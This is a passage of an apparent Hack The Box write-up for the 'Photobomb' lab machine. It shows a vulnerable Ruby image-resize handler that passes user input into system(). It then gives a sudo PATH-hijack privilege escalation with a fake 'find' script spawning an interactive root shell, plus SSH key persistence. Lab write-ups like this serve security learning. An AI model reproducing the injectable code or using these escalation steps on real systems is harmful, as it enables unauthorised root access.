+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">if</span> <span class="z-keyword z-operator z-logical z-ruby">!</span>filetype<span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">match</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-regexp z-ruby"><span class="z-string z-regexp z-classic z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">/</span>^<span class="z-meta z-string z-ruby"><span class="z-string z-regexp z-group z-ruby"><span class="z-punctuation z-definition z-group z-ruby">(</span>png|jpg<span class="z-punctuation z-definition z-group z-ruby">)</span></span></span><span class="z-punctuation z-definition z-string z-end z-ruby">/</span></span></span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">        halt <span class="z-constant z-numeric z-integer z-decimal z-ruby">500</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>Invalid filetype.<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">if</span> <span class="z-keyword z-operator z-logical z-ruby">!</span>dimensions<span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">match</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-regexp z-ruby"><span class="z-string z-regexp z-classic z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">/</span>^<span class="z-meta z-string z-ruby"><span class="z-string z-regexp z-character-class z-ruby"><span class="z-punctuation z-definition z-character-class z-ruby">[</span>0-9<span class="z-punctuation z-definition z-character-class z-ruby">]</span></span></span>+x<span class="z-meta z-string z-ruby"><span class="z-string z-regexp z-character-class z-ruby"><span class="z-punctuation z-definition z-character-class z-ruby">[</span>0-9<span class="z-punctuation z-definition z-character-class z-ruby">]</span></span></span>+$<span class="z-punctuation z-definition z-string z-end z-ruby">/</span></span></span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">        halt <span class="z-constant z-numeric z-integer z-decimal z-ruby">500</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>Invalid dimensions.<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">case</span> filetype
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">when</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>png<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">        content_type <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>image/png<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">when</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>jpg<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">        content_type <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>image/jpeg<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    filename <span class="z-keyword z-operator z-assignment z-ruby">=</span> photo<span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">sub</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>.jpg<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span><span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>_<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> dimensions <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>.<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> filetype
+</span><span class="z-source z-ruby">    response<span class="z-punctuation z-section z-array z-ruby">[</span><span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>Content-Disposition<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span><span class="z-punctuation z-section z-array z-ruby">]</span> <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>attachment; filename=</span><span class="z-meta z-interpolation z-ruby"><span class="z-punctuation z-section z-interpolation z-begin z-ruby">#{</span></span><span class="z-meta z-interpolation z-ruby"><span class="z-source z-ruby z-embedded z-ruby">filename</span><span class="z-punctuation z-section z-interpolation z-end z-ruby">}</span></span><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">if</span> <span class="z-keyword z-operator z-logical z-ruby">!</span><span class="z-support z-class z-ruby">File</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>exists?<span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>resized_images/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> filename<span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">        command <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>convert source_images/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> photo <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span> -resize <span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> dimensions <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span> resized_images/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> filename
+</span><span class="z-source z-ruby">        <span class="z-support z-function z-builtin z-ruby">puts</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>Executing: </span><span class="z-meta z-interpolation z-ruby"><span class="z-punctuation z-section z-interpolation z-begin z-ruby">#{</span></span><span class="z-meta z-interpolation z-ruby"><span class="z-source z-ruby z-embedded z-ruby">command</span><span class="z-punctuation z-section z-interpolation z-end z-ruby">}</span></span><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span>
+</span><span class="z-source z-ruby">        <span class="z-support z-function z-builtin z-ruby">system</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span>command<span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">else</span>
+</span><span class="z-source z-ruby">        <span class="z-support z-function z-builtin z-ruby">puts</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>File already exists.<span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">if</span> <span class="z-support z-class z-ruby">File</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>exists?<span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>resized_images/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> filename<span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">        halt <span class="z-constant z-numeric z-integer z-decimal z-ruby">200</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-punctuation z-section z-scope z-ruby">{</span><span class="z-punctuation z-section z-scope z-ruby">}</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-support z-class z-ruby">IO</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>read<span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>resized_images/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> filename<span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    <span class="z-comment z-line z-number-sign z-ruby"><span class="z-punctuation z-definition z-comment z-ruby">#</span>message = &#39;Failed to generate a copy of &#39; + photo + &#39; resized to &#39; + dimensions + &#39; with filetype &#39; + filetype
+</span></span><span class="z-source z-ruby">    message <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>Failed to generate a copy of <span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> photo
+</span><span class="z-source z-ruby">    halt <span class="z-constant z-numeric z-integer z-decimal z-ruby">500</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> message
+</span></code></pre>
+<p>The <code>server.rb</code> file is responsible for handling requests related to resizing
+and downloading images using Sinatra. It performs a few validation on the
+inputs, and it uses the <code>convert</code> utility to actually convert and resize the
+image.</p>
+<h3 id="sudo-permissions">Sudo permissions</h3>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Matching Defaults entries for wizard on photobomb:
+</span><span class="z-text z-plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">User wizard may run the following commands on photobomb:
+</span><span class="z-text z-plain">    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+</span></code></pre>
+<p>We do! We can execute the <code>/opt/cleanup.sh</code> binary as <code>root</code> while setting up
+custom environment variables.</p>
+<h3 id="inspecting-opt-cleanup-sh">Inspecting <code>/opt/cleanup.sh</code></h3>
+<p>Let's see what the <code>cleanup.sh</code> file contains:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-dot z-shell">.</span></span><span class="z-meta z-function-call z-arguments z-shell"> /opt/.bashrc</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/wizard/photobomb</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> clean up log files</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>s</span> log/photobomb.log <span class="z-support z-function z-test z-end z-shell">]</span></span> <span class="z-keyword z-operator z-logical z-and z-shell">&amp;&amp;</span> <span class="z-keyword z-operator z-logical z-shell">!</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>L</span> log/photobomb.log <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/bin/cat</span></span><span class="z-meta z-function-call z-arguments z-shell"> log/photobomb.log <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>log/photobomb.log.old</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/bin/truncate</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s0</span> log/photobomb.log</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> protect the priceless originals</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">find</span></span><span class="z-meta z-function-call z-arguments z-shell"> source_images<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>type</span> f<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>name</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>*.jpg<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>exec</span> chown root:root <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span><span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span> <span class="z-constant z-character z-escape z-shell">\;</span></span>
+</span></code></pre>
+<p>It's a Bash script that sources the <code>/opt/.bashrc</code> file, and then that cleans up
+log files. It also changes the owner of the source images to <code>root</code>.</p>
+<p>If we check the sourced <code>.bashrc</code> file, we see that it's mostly a standard Bash
+configuration file. It does contain some weird lines, which are in fact
+exploitable to get <code>root</code>, but I'll ignore them.</p>
+<p>Unfortunately, we can't edit neither of these files. But the script calls the
+<code>find</code> command without specifying its absolute path, so we should be able to
+perform a path hijacking attack!</p>
+<h2 id="privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</h2>
+<h3 id="preparation-1">Preparation</h3>
+<p>The goal is to obtain an elevated shell.</p>
+<p>I'll create a <code>find</code> script in <code>/tmp</code> to execute <code>/bin/bash</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/bin/bash</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span></span>
+</span></code></pre>
+<p>Then, I'll make it executable.</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Let's abuse our <code>sudo</code> permissions to execute the <code>/opt/cleanup.sh</code> file as
+<code>root</code>, while specifying a custom <code>PATH</code> environment variable:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>PATH=/tmp:<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">PATH</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/cleanup.sh<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root@photobomb:/home/wizard/photobomb#
+</span></code></pre>
+<p>Yay!</p>
+<h3 id="establishing-persistence">Establishing persistence</h3>
+<p>Let's use SSH to establish persistence.</p>
+<p>Our home folder contains a <code>.ssh</code> folder. There's no existing private key, so
+I'll create one, and I'll add the corresponding public key to <code>authorized_keys</code>.
+Finally, I'll connect over SSH to Photobomb as <code>root</code>.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">a3c22d3079b454f8607db6a294c0e4c4
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated both the user and root flags as 'Easy' to obtain. It was kinda easy to
+find credentials for the <code>/printer</code> web page and the OS command injection
+afterwards, and really straightforward to exploit to get a foothold. The
+privilege escalation was also really easy, since it was a classic path hijacking
+vulnerability.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
